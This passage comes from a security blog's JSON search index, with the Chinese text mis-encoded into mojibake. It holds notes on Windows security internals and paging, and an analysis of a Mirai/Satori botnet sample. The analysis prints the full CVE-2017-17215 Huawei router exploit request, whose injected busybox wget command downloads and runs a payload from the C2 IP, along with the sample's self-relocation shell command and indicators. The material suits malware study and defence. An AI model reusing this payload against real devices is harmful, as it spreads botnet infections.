SASï¼ˆå®‰å…¨æ³¨æ„åºåˆ—ï¼‰ï¼Œä»¥åŠç®¡ç†äº¤äº’å¼ç™»å½•ä¼šè¯ã€‚å½“ç”¨æˆ·ç™» å½•åˆ°ç³»ç»Ÿä¸­æ—¶ï¼Œwinlogon åˆ›å»ºä¸€ä¸ªåˆå§‹è¿›ç¨‹ï¼Œå¹¶è¿›ä¸€æ­¥ç”±å®ƒåˆ›å»ºå¤–å£³ï¼ˆshellï¼‰è¿›ç¨‹ã€‚ Lsassï¼ˆLocal Security Authentic SubSystemæœ¬åœ°å®‰å…¨æƒå¨å­ç³»ç»Ÿï¼‰ï¼Œè´Ÿè´£æœ¬åœ°ç³»ç»Ÿçš„å®‰å…¨ç­–ç•¥ï¼ŒåŒæ—¶ï¼Œå®ƒä¹Ÿè®¤è¯ç”¨æˆ·çš„ èº«ä»½ï¼Œä»¥åŠå°†å®‰å…¨å®¡è®¡æ¶ˆæ¯å‘é€åˆ°ç³»ç»Ÿçš„äº‹ä»¶æ—¥å¿—ä¸­ã€‚ SAMï¼ˆå®‰å…¨è´¦æˆ·ç®¡ç†å™¨ï¼‰æ•°æ®åº“ï¼ŒåŒ…å«äº†æœ¬åœ°ç”¨æˆ·å’Œç”¨æˆ·ç»„ï¼Œä»¥åŠå®ƒä»¬çš„å£ä»¤å’Œå…¶ ä»–å±æ€§ã€‚å®ƒä½äºæ³¨å†Œè¡¨çš„ HKLM\\SAM ä¸‹é¢ã€‚ç”±äº HKLM\\SAM é”®åªå…è®¸æœ¬åœ°ç³»ç»Ÿè´¦ æˆ·è®¿é—®ï¼Œæ‰€ä»¥ï¼Œé™¤éç”¨æˆ·åœ¨ Local System è´¦æˆ·ä¸‹è¿è¡Œ regedit.exe å·¥å…·ï¼Œå¦åˆ™æ— æ³•è®¿é—® HKLM\\SAM å­æ ‘ã€‚ LSA ç­–ç•¥æ•°æ®åº“ï¼ŒåŒ…å«äº†æœ‰å…³å½“å‰ç³»ç»Ÿçš„ä¸€äº›ä¿¡æ¯ï¼Œè­¬å¦‚è°å…è®¸è®¿é—®ç³»ç»Ÿä»¥åŠå¦‚ä½• è®¿é—®ï¼ˆäº¤äº’å¼ç™»å½•ã€ç½‘ç»œç™»å½•æˆ–è€…ä»¥æœåŠ¡æ–¹å¼ç™»å½•ï¼‰ï¼›åˆ†é…ç»™è°å“ªäº›ç‰¹æƒï¼›å®‰å…¨å®¡è®¡ å¦‚ä½•è¿›è¡Œç­‰ã€‚å¦‚åŒ SAM æ•°æ®åº“ä¸€æ ·ï¼ŒLSA ç­–ç•¥æ•°æ®åº“ä¹Ÿå­˜å‚¨åœ¨æ³¨å†Œè¡¨ä¸­ï¼Œä½äº HKLM\\SECURITY ä¸‹é¢ã€‚åŒæ ·åœ°ï¼Œé™¤äº† Local System è´¦æˆ·ä»¥å¤–çš„å…¶ä»–è´¦æˆ·å‡æ— æ³•è®¿ é—® HKLM\\SECURITY å­æ ‘ã€‚ winlogon è´Ÿè´£ç³»ç»Ÿç™»å½•ï¼ŒåŒ…æ‹¬å¯¹ç”¨æˆ·èº«ä»½çš„è®¤è¯ï¼›lsass è´Ÿè´£ç®¡ç†ç³»ç»Ÿæœ¬åœ°å®‰å…¨ç­–ç•¥ï¼Œå¹¶ä¸”å°†è¿™äº›ç­–ç•¥é€šçŸ¥åˆ°å†…æ ¸ä¸­çš„ SRMã€‚åœ¨å†…æ ¸ ä¸­ï¼ŒSRM è´Ÿè´£å®ç°åŸºäºå¯¹è±¡çš„è®¿é—®æ§åˆ¶ä»¥åŠç³»ç»Ÿå…¨å±€å®‰å…¨ç­–ç•¥çš„å®æ–½ã€‚ å…³äºä¸€äº›ææƒ åœ¨ Windows ä¸­ï¼Œç‰¹æƒæ˜¯ç”± LUID å¯¹è±¡æ¥æ ‡è¯†çš„ï¼ŒLUID ä»£è¡¨ä¸€ä¸ªæœ¬åœ°å”¯ä¸€æ ‡è¯†ç¬¦ï¼ˆLocally Unique Identifierï¼‰ 12345678typedef struct _LUID_AND_ATTRIBUTES &#123; LUID Luid; ULONG Attributes; &#125; LUID_AND_ATTRIBUTES, * PLUID_AND_ATTRIBUTES; #define SE_PRIVILEGE_ENABLED_BY_DEFAULT (0x00000001L) #define SE_PRIVILEGE_ENABLED (0x00000002L) #define SE_PRIVILEGE_REMOVED (0X00000004L) #define SE_PRIVILEGE_USED_FOR_ACCESS (0x80000000L) Windows å†…æ ¸ä¸­å®šä¹‰äº†ä¸€ç»„ç‰¹æƒï¼Œå³ç±»å‹ä¸º LUID çš„ Seå…¨å±€å˜é‡ã€‚Windows å†…æ ¸ä¸­ï¼Œä¸å®‰å…¨ç›¸å…³çš„å‡½æ•°ä»¥â€œSeâ€ä½œä¸ºå‰ç¼€ï¼Œæœ‰ä¸€äº›å®‰å…¨å‡½æ•°è¿˜å­˜åœ¨å¯¹åº”çš„ç³» ç»ŸæœåŠ¡ã€‚è¿™äº›ç³»ç»ŸæœåŠ¡å‡½æ•°çš„åç§°ä»¥â€œNtâ€ä½œä¸ºå‰ç¼€ï¼Œåé¢éƒ¨åˆ†ä¸â€œSeâ€å‡½æ•°ç›¸åŒã€‚ V. Windowsçš„å¼•å¯¼è¿‡ç¨‹ æœ€å¼€å§‹ä¹Ÿæ˜¯ä»ç»å…¸çš„MBRå¼€å§‹ï¼Œç„¶åæ˜¯ntldrçš„osloaderã€‚ åœ¨osloaderä¸­å°†ç‰©ç†åœ°å€è½¬ä¸ºè™šæ‹Ÿåœ°å€ï¼Œè¯¥è¿‡ç¨‹å¯è§ï¼šwindows_kernel_driver_2ä¸­å¯¹CR3ã€CR4å¯„å­˜å™¨çš„æ§åˆ¶ã€‚ ä¹‹åosloaderåŠ è½½NTDETECT.COMç¨‹åºï¼Œåˆ©ç”¨ç³»ç»ŸBIOSæŸ¥è¯¢ç³»ç»ŸåŸºæœ¬è®¾å¤‡ï¼Œåœ¨å¼•å¯¼è¿‡ç¨‹çš„åæœŸè¢«å­˜æ”¾åˆ°æ³¨å†Œè¡¨ HKLM\\HARDWARE\\DESCRIPTION os loader åŠ è½½å†…æ ¸æ¨¡å—æ˜ åƒæ–‡ä»¶ï¼Œé»˜è®¤ä¸º ntoskrnl.exeï¼Œä»¥åŠ HAL æ˜ åƒæ–‡ä»¶ï¼Œé»˜ è®¤ä¸º hal.dllã€‚å†åŠ è½½æ³¨å†Œè¡¨çš„ SYSTEM å‚¨å·¢ï¼Œå³\\WINDOWS\\system32\\config\\system æ–‡ä»¶ã€‚ ç„¶åæ˜¯å†…æ ¸çš„åˆå§‹åŒ–ï¼Œæ­¤å…¥å£å‡½æ•°ä¸º KiSystemStartup ä¸ºäº†è§£å†³åœ¨åˆå§‹åŒ–è¿‡ç¨‹ä¸­çš„ç›¸äº’ä¾èµ– æ€§é—®é¢˜ï¼Œå†…æ ¸çš„åˆå§‹åŒ–åˆ†ä¸¤ä¸ªé˜¶æ®µè¿›è¡Œï¼Œç§°ä¸ºé˜¶æ®µ 0 å’Œé˜¶æ®µ 1ã€‚å¤§å¤šæ•°å†…æ ¸ç»„ä»¶çš„åˆå§‹åŒ–å‡½ æ•°ç›¸åº”åœ°å¸¦æœ‰ä¸€ä¸ªæ•´æ•°å‚æ•°ï¼Œä»¥æŒ‡æ˜ä¸€æ¬¡è°ƒç”¨æ˜¯é˜¶æ®µ 0 åˆå§‹åŒ–è¿˜æ˜¯é˜¶æ®µ 1 åˆå§‹åŒ–ï¼Œè€Œæœ‰äº›ç»„ ä»¶çš„åˆå§‹åŒ–å‡½æ•°é€šè¿‡æ£€æŸ¥ä¸€ä¸ªå…¨å±€å˜é‡ InitializationPhase çš„å€¼æ¥åˆ¤æ–­å½“å‰å¤„äºå“ªä¸ªé˜¶æ®µã€‚ é˜¶æ®µ 0 åˆå§‹åŒ–çš„ç›®çš„æ˜¯ï¼Œå°†é˜¶æ®µ 1 åˆå§‹åŒ–æ‰€è¦ç”¨åˆ°çš„åŸº æœ¬æ•°æ®ç»“æ„å»ºç«‹èµ·æ¥ã€‚è¿™æ—¶ä¸­æ–­è¢«ç¦æ­¢ï¼Œè°ƒæ•´IDTã€TSSã€PCRç­‰ã€‚æ¥ç€è°ƒç”¨ KiInitializeKernel å‡½æ•°ï¼Œæ‰§è¡Œå†…æ ¸åˆå§‹åŒ–ã€‚æœ€åï¼Œå½“å‰çº¿ç¨‹èœ•å˜æˆä¸€ä¸ªç©ºé—²çº¿ç¨‹ã€‚ V. Windowså‘å¸ƒå†å² MicroSoftåœ¨æ“ä½œç³»ç»Ÿé¢†åŸŸä¸­æœ€å¼€å§‹èµ·æºäºMS-DOSï¼Œéšåæ¼”å˜å‡ºäº†ä¸¤ä¸ªåˆ†æ”¯ï¼Œæœ€å¼€å§‹çš„Win 95/98/Meï¼Œä¹‹åå°±æ˜¯åŸºäºWindows NTçš„å†…æ ¸ç‰ˆæœ¬çš„Window XP/7/8/10/vistaçš„ç‰ˆæœ¬ã€‚ ç‰ˆæœ¬ å‘å¸ƒæ—¥æœŸ ä¸»è¦ç‰¹ç‚¹ å†…æ ¸ç‰ˆæœ¬ Windows 1.0 1985å¹´11æœˆ åˆå§‹ç‰ˆæœ¬ï¼Œæä¾›åŸºæœ¬çš„å›¾å½¢ç”¨æˆ·ç•Œé¢å’Œåº”ç”¨ç¨‹åºæ”¯æŒ 1.0 Windows 2.0 1987å¹´12æœˆ å¼•å…¥äº†çª—å£é‡å ã€å›¾æ ‡å’Œé”®ç›˜å¿«æ·é”®ç­‰æ”¹è¿› 2.0 Windows 3.0 1990å¹´5æœˆ æ”¯æŒå¤šä»»åŠ¡å¤„ç†å’ŒTrueTypeå­—ä½“ï¼Œç”¨æˆ·ç•Œé¢å¤§å¹…æ”¹è¿› 3.0 Windows 95 1995å¹´8æœˆ å…·æœ‰å¼€å§‹èœå•ã€ä»»åŠ¡æ å’Œ32ä½åº”ç”¨ç¨‹åºæ”¯æŒçš„é‡è¦ç‰ˆæœ¬ 4.0 Windows 98 1998å¹´6æœˆ å¼•å…¥äº†å¯¹USBè®¾å¤‡å’ŒDVDå…‰ç›˜çš„æ”¯æŒï¼Œæ”¹è¿›äº†ç³»ç»Ÿç¨³å®šæ€§ 4.10 Windows 2000 2000å¹´2æœˆ å¼ºåŒ–äº†ç³»ç»Ÿç¨³å®šæ€§å’Œå®‰å…¨æ€§ï¼Œæä¾›äº†ä¼ä¸šçº§ç‰¹æ€§ 5.0 Windows XP 2001å¹´10æœˆ å¼•å…¥äº†å…¨æ–°çš„ç”¨æˆ·ç•Œé¢ã€ç³»ç»Ÿæ¢å¤åŠŸèƒ½å’Œå¤šç”¨æˆ·æ”¯æŒ 5.1 Windows Vista 2007å¹´1æœˆ å…¨æ–°çš„ç”¨æˆ·ç•Œé¢ã€æ›´é«˜çš„å®‰å…¨æ€§å’Œç³»ç»Ÿç¨³å®šæ€§ 6.0 Windows 7 2009å¹´10æœˆ ä¼˜åŒ–äº†ç”¨æˆ·ç•Œé¢å’Œæ€§èƒ½ï¼Œæ”¹è¿›äº†ä»»åŠ¡æ å’Œçª—å£ç®¡ç† 6.1 Windows 8 2012å¹´10æœˆ å¼•å…¥äº†å…¨æ–°çš„å¼€å§‹å±å¹•å’Œè§¦æ‘¸ä¼˜åŒ–çš„ç”¨æˆ·ç•Œé¢ 6.2 Windows 10 2015å¹´7æœˆ ç»Ÿä¸€äº†æ¡Œé¢å’Œç§»åŠ¨è®¾å¤‡å¹³å°ï¼Œå¼•å…¥äº†Windowsåº”ç”¨å•†åº— 10.0 Windows 11 2021å¹´10æœˆ æ–°çš„ç”¨æˆ·ç•Œé¢è®¾è®¡ã€æ”¹è¿›çš„æ€§èƒ½å’Œå®‰å…¨æ€§ï¼Œæ”¯æŒAndroidåº”ç”¨ 10.0","categories":[{"name":"notes","slug":"notes","permalink":"https://joe1sn.eu.org/categories/notes/"},{"name":"kernel","slug":"notes/kernel","permalink":"https://joe1sn.eu.org/categories/notes/kernel/"}],"tags":[{"name":"kernel","slug":"kernel","permalink":"https://joe1sn.eu.org/tags/kernel/"},{"name":"windows","slug":"windows","permalink":"https://joe1sn.eu.org/tags/windows/"}]},{"title":"Mirai Botnetåˆ†æ”¯Satoriåˆ†æ","slug":"mirai-bota","date":"2023-03-25T10:42:45.000Z","updated":"2023-06-01T14:29:56.735Z","comments":true,"path":"2023/03/25/mirai-bota/","link":"","permalink":"https://joe1sn.eu.org/2023/03/25/mirai-bota/","excerpt":"æš‚æ—¶å…ˆæ›´æ–°è¿™ä¹ˆå¤šï¼Œåé¢åº”è¯¥è¿˜æœ‰ç›¸å…³ä½œè€…è¢«æŠ“çš„ä¸€äº›æ¶ˆæ¯å’Œæ›´å¤šåŠŸèƒ½çš„é€†å‘","text":"æš‚æ—¶å…ˆæ›´æ–°è¿™ä¹ˆå¤šï¼Œåé¢åº”è¯¥è¿˜æœ‰ç›¸å…³ä½œè€…è¢«æŠ“çš„ä¸€äº›æ¶ˆæ¯å’Œæ›´å¤šåŠŸèƒ½çš„é€†å‘ åŸºæœ¬æƒ…å†µ åç§° x86_64 MD5 fe7ca3b588e342f79c7814bb75dc24d7 SHA256 e436196f047741070c580695f5444e0c2cdd175c88f68affdc9230d09a71c978 Domain botnet.nguyennghi.info ip 103.183.118.73 é€†å‘åˆ†æ åŸºæœ¬æƒ…å†µ 64ä½ELFå¯æ‰§è¡Œæ–‡ä»¶ é€†å‘å·¥ç¨‹ é€šè¿‡startæ‰¾åˆ°mainå‡½æ•° ä½¿ç”¨IDApythonè„šæœ¬å¯¹ç±»ä¼¼çš„åº“å‡½æ•°å®ç°è¿›è¡Œå‡½æ•°é‡å‘½å 1234567891011121314151617181920import idautilsimport idaapiimport ida_nameimport idcfor func_ea in idautils.Functions(): func = idaapi.get_func(func_ea) name = idaapi.get_func_name(func_ea) for head in idautils.Heads(func.start_ea, func.end_ea): try: code = idc.GetDisasm(head) if &quot;syscall&quot; in code: print(&quot;Function: &#123;&#125;&quot;.format(name).ljust(0x40,&#x27;-&#x27;)) print(code[21:].ljust(0x30,&quot;=&quot;)) ida_name.set_name(func.start_ea, code[21:]) idc.set_func_flags(func.start_ea, idc.get_func_flags(func_ea) | idaapi.FUNC_LIB) except: pass mainå‡½æ•° é¦–å…ˆåˆ›å»ºå‘8.8.8.8:13568çš„socketè¿æ¥ï¼Œé€šè¿‡getsocknameæµ‹è¯•ç½‘ç»œæ˜¯å¦è¿é€šå¹¶è·å¾—æœ¬æœºipåœ°å€ åˆå§‹åŒ–åŠ å¯†æ¶ˆæ¯ ç”±äºä½¿ç”¨æœªçŸ¥ç‰ˆæœ¬çš„libåº“è¿›è¡Œé™æ€ç¼–è¯‘ï¼Œæ‰€ä»¥éœ€è¦æ‰‹åŠ¨è¯†åˆ«ä¸€äº›libå‡½æ•°ã€‚ æ¯”å¦‚è¿™é‡Œä½¿ç”¨mallocåˆ†é…å¹¶å°†å¯†æ–‡ä½¿ç”¨strncpyå°†æ¶ˆæ¯å¤åˆ¶åˆ°å †ä¸­ åˆ©ç”¨pidå’Œéšæœºæ•°è¿›è¡Œéšæœºæ•°ç”Ÿæˆï¼Œå¯¹è¿›ç¨‹è¿›è¡Œéšæœºæ”¹å å°†timeç”Ÿæˆçš„ä¼ªéšæœºæ•°å’Œpidè¿›è¡Œå¼‚æˆ–ç­‰æ“ä½œå¾—åˆ°éšæœºæ•° é€šè¿‡ä½ç§»ç­‰æ“ä½œå®ç°éšæœºæ•°çš„èŒƒå›´æ§åˆ¶ åœ¨ä¹‹åä½¿ç”¨ptrclè¿›è¡Œè¿›ç¨‹çš„é‡å‘½å æ‹¼æ¥æŒ‡ä»¤è¿‡åï¼Œä¿®æ”¹ç›¸å…³ä¿¡å·å˜é‡å€¼ï¼Œå¹¶åœ¨vforkçš„execlä¸­æ‰§è¡Œ æ‹¼æ¥å‘½ä»¤å­—ç¬¦ä¸² è®¾ç½®ä¿¡å·é‡å¹¶ä½¿ç”¨vforkæ‰§è¡Œ vforkéƒ¨åˆ† æ‰§è¡Œçš„è¯­å¥ä¸º 1/bin/sh sh -c rm -rf $root_random_name &amp;&amp; mkdir bin; &gt; $cur_random_name &amp;&amp; mv $pwd $root_random_name ; chmod 777 $root_random_name ä¾‹å¦‚ 1/bin/sh sh -c rm -rf bin/watchdog &amp;&amp; mkdir bin \\336\\377\\377\\377\\177; &gt;bin/watchdog &amp;&amp; mv /home/test/Desktop/HackedByAlan/check/mirai bin/watchdog; chmod 777 bin/watchdog éšæœºé€‰æ‹© &quot;/bin/busybox&quot;;ã€&quot;/bin/watchdog&quot;ã€&quot;/bin/systemd&quot;ä¸­çš„ä¸€ä¸ªï¼ˆ$root_random_nameï¼‰ä¸­çš„ä¸€ä¸ªåˆ é™¤ å½“å‰æ–‡ä»¶å¤¹åˆ›å»ºbinç›®å½• å°†å½“å‰ç›®å½•ä¸‹çš„ç—…æ¯’ç§»åŠ¨è‡³åˆ›å»ºçš„binç›®å½•ä¸­ï¼Œå¹¶é‡å‘½å$root_random_name ç»™äºˆbin/$root_random_nameæœ€é«˜æƒé™ é€šè¿‡å¤šæ¬¡è¿è¡Œå¯ä»¥æˆåŠŸå®ç°ï¼Œå¦‚æœ&amp;&amp; mkdir bin \\336\\377\\377\\377\\177ä¸­æ²¡æœ‰ä¹±ç ï¼Œé‚£ä¹ˆå°±ä¼šæ‰§è¡Œåä¸€å¥ ä½¿ç”¨å¼‚æˆ–è§£å¯†å­—ç¬¦ä¸²å¹¶æ‰“å°ï¼Œå®ŒæˆååŠ å¯†å­—ç¬¦ä¸² è¿‡ç¨‹ åˆ©ç”¨å…¶è‡ªèº«çš„è§£å¯†è„šæœ¬ï¼Œå¯ä»¥è§£å¯†æ‰€æœ‰å¯†æ–‡ 1234567891011121314151617181920212223242526str1 = [ 0x4C, 0x41, 0x5A, 0x40, 0x4B, 0x5A, 0x00, 0x40, 0x49, 0x5B, 0x57, 0x4B, 0x40, 0x40, 0x49, 0x46, 0x47, 0x00, 0x47, 0x40, 0x48, 0x41, 0x2E]str2 = [0x4A, 0x41, 0x40, 0x4B]str3 = [0x01, 0x5E, 0x5C, 0x41, 0x4D, 0x01, 0x2E]str4 = [0x01, 0x4B, 0x56, 0x4B, 0x2E]str5 = [0x01, 0x48, 0x4A, 0x2E]str6 = [0x01, 0x4D, 0x43, 0x4A, 0x42, 0x47, 0x40, 0x4B, 0x2E]key = 0x6D53D2C2def decrypt(cipher:list): v3 = key &amp; 0xFF v4 = key &gt;&gt; 8 v5 = (key &gt;&gt; 16) &amp; 0xFFFF v6 = (key &gt;&gt; 24) &amp; 0xFF result = &quot;&quot; for i in cipher: result += chr((i^v3^v4^v5^v6 )&amp; 0xFF) return resultif __name__ == &#x27;__main__&#x27;: print(&quot;1&quot;, decrypt(str1)) print(&quot;2&quot;, decrypt(str2)) print(&quot;3&quot;, decrypt(str3)) print(&quot;4&quot;, decrypt(str4)) print(&quot;5&quot;, decrypt(str5)) print(&quot;6&quot;, decrypt(str6)) åŠ å¯†å­—ç¬¦ä¸²ï¼Œç”±äºæ˜¯å¼‚æˆ–åŠ å¯†ï¼Œæ‰€ä»¥åŠ è§£å¯†ç®—æ³•ä¸€è‡´ åˆé€‚å‡½æ•°è¡¨ï¼Œè®²å‡½æ•°æ”¾åˆ°ä¸€ä¸ªtableä¸­ ä½¿ç”¨forkè·å¾—å­è¿›ç¨‹ï¼Œæ‰“å¼€/procæ–‡ä»¶å¤¹å¹¶è¯»å–å…¶ä¸­çš„æ–‡ä»¶ï¼Œå…³é—­é™¤å¿…è¦è¿›ç¨‹å¤–çš„æ‰€æœ‰è¿›ç¨‹ æ‰“å¼€/proc/æ–‡ä»¶å¤¹ å…³é—­é™¤å¿…è¦è¿›ç¨‹å¤–çš„æ‰€æœ‰è¿›ç¨‹ ä½¿ç”¨SSDPåè®®è¿›è¡Œç½‘ç»œå‘åŒ…ï¼Œä½¿ç”¨åä¸ºHG532è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´ï¼ˆCVE-2017-17215ï¼‰çš„payloadè¿›è¡Œå‘åŒ…ï¼Œè¿›è¡Œæ”»å‡» è¿›è¡Œæ”»å‡» åˆ›å»ºsocket è®¾ç½® socket é€‰é¡¹ï¼Œå…è®¸å‘ç»„æ’­åœ°å€å‘é€æ•°æ® è®¾ç½®ç›®æ ‡åœ°å€å’Œç«¯å£å· æ„é€  M-SEARCH è¯·æ±‚æŠ¥æ–‡ï¼Œå‘é€æœç´¢è¯·æ±‚ payloadåˆ†æ 12345678910111213141516POST /ctrlt/DeviceUpgrade_1 HTTP/1.1Connection: keep-aliveAccept: */*Authorization: Digest username=&quot;dslf-config&quot;, realm=&quot;HuaweiHomeGateway&quot;, nonce=&quot;88645cefb1f9ede0e336e3569d75ee30&quot;, uri=&quot;/ctrlt/DeviceUpgrade_1&quot;, response=&quot;3612f843a42db38f48f59d2a3597e19c&quot;, algorithm=&quot;MD5&quot;, qop=&quot;auth&quot;, nc=00000001, cnonce=&quot;248d1a2560100669&quot;Content-Length: 457&lt;?xml version=&quot;1.0&quot; ?&gt;&lt;s:Envelope xmlns:s=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot; s:encodingStyle=&quot;http://schemas.xmlsoap.org/soap/encoding/&quot;&gt; &lt;s:Body&gt; &lt;u:Upgrade xmlns:u=&quot;urn:schemas-upnp-org:service:WANPPPConnection:1&quot;&gt; &lt;NewStatusURL&gt;$(/bin/busybox wget -g 103.183.118.73 -l /tmp/.oxy -r /mips; /bin/busybox chmod 777 /tmp/.oxy; /tmp/.oxy selfrep.huawei)&lt;/NewStatusURL&gt; &lt;NewDownloadURL&gt;$(echo HUAWEIUPNP)&lt;/NewDownloadURL&gt; &lt;/u:Upgrade&gt; &lt;/s:Body&gt;&lt;/s:Envelope&gt; æ ¸å¿ƒè¯­å¥ /bin/busybox wget -g 103.183.118.73 -l /tmp/.oxy -r /mips; /bin/busybox chmod 777 /tmp/.oxy; /tmp/.oxy selfrep.huawei ç½‘ç»œè¿æ¥ç›¸å…³ DNS SERVER anuj.ns.cloudflare.com. 173.245.59.65 anuj.ns.cloudflare.com CLOUDFLARENET United States raphaela.ns.cloudflare.com. 108.162.194.192 raphaela.ns.cloudflare.com CLOUDFLARENET United States Host Records (A) nguyennghi.info HTTP: cloudflare 104.21.78.122 CLOUDFLARENET unknown antiddos.nguyennghi.info 103.161.181.140 DVS-AS-VN VIET DIGITAL TECHNOLOGY LIABILITY COMPANY Vietnam checkht4gvpn.nguyennghi.info HTTP: cloudflare 172.67.220.248 CLOUDFLARENET United States","categories":[{"name":"notes","slug":"notes","permalink":"https://joe1sn.eu.org/categories/notes/"}],"tags":[{"name":"notes","slug":"notes","permalink":"https://joe1sn.eu.org/tags/notes/"},{"name":"git","slug":"git","permalink":"https://joe1sn.eu.org/tags/git/"}]},{"title":"windowså†…æ ¸é©±åŠ¨ 2-é¡µè¡¨æ¢ç´¢","slug":"windows_kernel_driver_2","date":"2023-02-17T07:21:36.000Z","updated":"2023-06-01T14:36:31.026Z","comments":true,"path":"2023/02/17/windows_kernel_driver_2/","link":"","permalink":"https://joe1sn.eu.org/2023/02/17/windows_kernel_driver_2/","excerpt":"æ¢ç´¢CR4 æ¢ç´¢é¡µé¢ CR3å¯„å­˜å™¨äºé¡µéå† è™šæ‹Ÿåœ°å€-&gt;ç‰©ç†åœ°å€","text":"æ¢ç´¢CR4 æ¢ç´¢é¡µé¢ CR3å¯„å­˜å™¨äºé¡µéå† è™šæ‹Ÿåœ°å€-&gt;ç‰©ç†åœ°å€ [é©±åŠ¨å¼€å‘]æ¢ç´¢CR4 è‹±ç‰¹å°”Â® 64 ä½å’Œ IA-32 æ¶æ„å¼€å‘äººå‘˜æ‰‹å†Œåˆè®¢æœ¬ ç¬¬3å·ç¬¬å››ç« ç¬¬äº”å°èŠ‚ã€Š4-LEVEL PAGING AND 5-LEVEL PAGINGã€‹ åˆ¤æ–­CPUæ˜¯å››çº§åˆ†é¡µè¿˜æ˜¯äº”çº§åˆ†é¡µ page: 3074 è¯¥å¯„å­˜å™¨çš„å€¼å†³å®šäº†æ˜ å°„å±‚çº§æ˜¯4/5ï¼Œ 1ï¼š5çº§åˆ†é¡µ 0ï¼š4çº§åˆ†é¡µ 12345678//__readcr4() &amp; 0x1000//__readcr4() &amp; (1&lt;&lt;12)CR4 Cr4 = &#123; .Value = __readcr4() &#125;;DbgPrint(&quot;CR4=0x%016I64X, CR4.LA57=%I64d\\n&quot;, Cr4.Value, Cr4.Fields.LA57);if (Cr4.Fields.LA57) DbgPrint(&quot;The system using 5 Level Paging&quot;);else DbgPrint(&quot;The system using 4 Level Paging&quot;); [é©±åŠ¨å¼€å‘]æ¢ç´¢é¡µé¢ CR3å¯„å­˜å™¨äºé¡µéå† CR3 å¯„å­˜å™¨è®¾è®¡ CR3[512][512][512][512] ä¸ªäººè§‰å¾—è¿™å—å„¿å’ŒCSAPPä¸Šé¢è®²çš„å·®ä¸å¤š é¡µå·=é¡µé¦–åœ°å€é¡µå¤§å°=é¡µé¦–åœ°å€4KB==é¡µé¦–åœ°å€212==é¡µé¦–åœ°å€&gt;&gt;12é¡µå· = \\frac{é¡µé¦–åœ°å€}{é¡µå¤§å°}= \\frac{é¡µé¦–åœ°å€}{4KB}== \\frac{é¡µé¦–åœ°å€}{2^{12}}== é¡µé¦–åœ°å€&gt;&gt;12é¡µå·=é¡µå¤§å°é¡µé¦–åœ°å€â€‹=4KBé¡µé¦–åœ°å€â€‹==212é¡µé¦–åœ°å€â€‹==é¡µé¦–åœ°å€&gt;&gt;12 12345678910111213//1.å¾—åˆ°CR3å¯„å­˜å™¨çš„å€¼ï¼Œä»è€Œå¾—åˆ°ä¸€çº§é¡µè¡¨åœ°å€CR3 Cr3 = &#123; .Value = __readcr3() &#125;;//2.å¯¹æ¯ä¸€ä¸ªä¸€çº§é¡µè¯»å–PL1PTE L1pt = MmGetVirtualForPhysical(L1ptPa.AsLargeInteger);for (int n1 = 0; n1 &lt; 512; n1++) &#123; if (!L1pt[n1].Fields.P || !L1pt[n1].Fields.U_S) continue; PA L2ptPa = &#123; .Fields4KB.PPN = L1pt[n1].Fields.PPN &#125;; DbgPrint(&quot;...&quot;); //3.å¾—åˆ°äºŒçº§é¡µè¡¨åœ°å€ PL2PTE L2pt = MmGetVirtualForPhysical(L2ptPa.AsLargeInteger); //4.ç±»ä¼¼åµŒå¥—å¾ªç¯ï¼Œéå† CR3çš„PPNæ˜¯ç¬¬12ä½ï¼Œå…±40bitï¼Œæ‰€ä»¥ä¸€çº§é¡µè¡¨æ˜¯è¿™ä¸ªå€¼ã€‚CR3çš„å°¾12ä½æ²¡æœ‰ç”¨å…¨ä¸º0ï¼ŒåŒæ—¶24=162^{4} = 1624=16ï¼Œé‚£ä¹ˆå‘å³ç§»12ä½ç­‰æ•ˆäº16ç¦æ­¢å³ç§»124=3\\frac{12}{4}=3412â€‹=3ä½ å¾—åˆ°Level_1_PageTableçš„å€¼è¿‡åï¼Œå¯ä»¥ä½¿ç”¨å‡½æ•°MmGetVirtualForPhysicalè·å¾—è¯¥å†…å­˜åœ°å€çš„å€¼ï¼Œä»è€Œéå†ä¸€çº§é¡µè¡¨ã€‚è¦åˆ¤æ–­å½“å‰L1pt.Pæ˜¯å¦æœ‰æ•ˆï¼ŒåŒæ—¶L1pt.U_Så¯ä»¥åˆ¤æ–­è¯¥é¡µçš„æƒé™ï¼Œè¯¦ç»†å¯ä»¥çœ‹å¼€å‘è€…æ‰‹å†Œ Table 4-20 ä¾æ¬¡å¾ªç¯å¯ä»¥éå†å®Œæ•´ä¸ªå†…å­˜é¡µï¼ˆä¸‹å›¾ä¸­L4ptæ”¾ä¸ä¸‹äº†ï¼‰ è™šæ‹Ÿåœ°å€-&gt;ç‰©ç†åœ°å€ ç¨‹åºæŒ‰ç…§4KBåˆ†é¡µä¸ªæ•°å¤ªå¤šä¸åˆ©äºå®éªŒï¼Œå¯ä»¥å¼ºåˆ¶å°†å…¶åˆ†é¡µä¸º1GBï¼Œè¿™æ ·ä¾¿äºç¿»è¯‘ ç¼–å†™ä¸€ä¸ªæµ‹è¯•ç¨‹åºï¼Œè¯¥ç¨‹åºèƒ½ç”³è¯·å‡ºä¸€é¡µçš„å†…å­˜ï¼Œå¹¶æ‰“å°å…¶å€¼ ä½¿ç”¨PsGetCurrentProcessè·å¾—å½“å‰è¿›ç¨‹PROCESSå¯¹è±¡ï¼Œè‹¥ç›¸ç­‰åˆ™ä¸å¯ç”¨æ–°æ–¹æ³• ä½¿ç”¨KeStackAttachProcessé™„åŠ åˆ°è¦ç¿»è¯‘çš„å†…å­˜çš„PROCESSå¯¹è±¡ä¸­ï¼Œä½¿ç”¨è€æ–¹æ³•è¾“å‡ºå°±OKäº†ï¼Œæœ€åKeUnstackDetachProcessè„±ç¦» ?å¦‚ä½•ä½¿ç”¨æŒ‰ç…§åå­—æŸ¥æ‰¾è¿›ç¨‹ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657#include &quot;win10.h&quot;NTSTATUSQuerySystemInformation(SYSTEM_INFORMATION_CLASS SystemInformationClass, PVOID* SystemInformation)&#123; NTSTATUS Status; PVOID Buffer; ULONG BufferSize = 4096; do &#123; Buffer = ExAllocatePool2(POOL_FLAG_NON_PAGED, BufferSize, &#x27;bisQ&#x27;); if (!Buffer) return STATUS_NO_MEMORY; Status = NtQuerySystemInformation(SystemInformationClass, Buffer, BufferSize, &amp;BufferSize); if (NT_SUCCESS(Status)) &#123; *SystemInformation = Buffer; return Status; &#125; ExFreePool(Buffer); if (STATUS_INFO_LENGTH_MISMATCH != Status) return Status; &#125; while 